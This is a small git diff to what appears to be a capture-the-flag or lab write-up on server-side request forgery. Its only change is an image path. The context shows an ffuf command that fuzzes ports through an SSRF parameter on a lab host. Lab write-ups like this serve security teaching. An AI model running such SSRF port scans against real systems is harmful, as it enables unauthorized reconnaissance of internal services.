@@ -209,4 +209,4 @@ _**Exploit the SSRF to identify open ports on the system. Which port is open in 
 ffuf -w num.txt -u http://10.129.75.48/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb:FUZZ&date=2024-01-01" -fr "Something" -v
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
